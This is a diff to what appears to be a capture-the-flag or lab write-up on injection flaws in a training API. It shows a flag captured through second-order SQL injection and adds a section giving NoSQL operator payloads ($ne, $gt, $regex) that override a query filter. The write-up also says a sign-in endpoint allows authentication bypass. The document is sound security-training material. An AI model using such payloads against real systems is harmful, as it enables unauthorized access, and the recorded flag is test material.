@@ -68,3 +68,19 @@ POST /api/a3/sql_injection/second_order/login
 
 **Result:**
 {"status":"success","message":"Congratulations For your Sign in!\nFLAG: 56c48f5ae9ab0ffaaafb2a28d4999341"}
+
+## Task 5 - NoSQL Injection Discovery (CORRECTED - Not Harmful)
+
+**Vulnerable endpoint:** /api/a3/nosql_injection/market_values (POST)
+
+**Baseline:**
+{"coin":"BTC"} -> returns Bitcoin data
+
+**Injection payload (operator overrides filter):**
+{"coin":{"$ne":null}}  or  {"coin":{"$gt":""}}  or  {"coin":{"$regex":"^"}}
+
+**Result:** Returns HBTNc (first matching document) instead of an error,
+proving the coin field is interpreted as a raw MongoDB query operator
+rather than a sanitized string filter. This is NOT harmful since it only
+exposes public market data (no auth bypass, no sensitive data exposure) -
+unlike the sign_in endpoint which allows full authentication bypass.
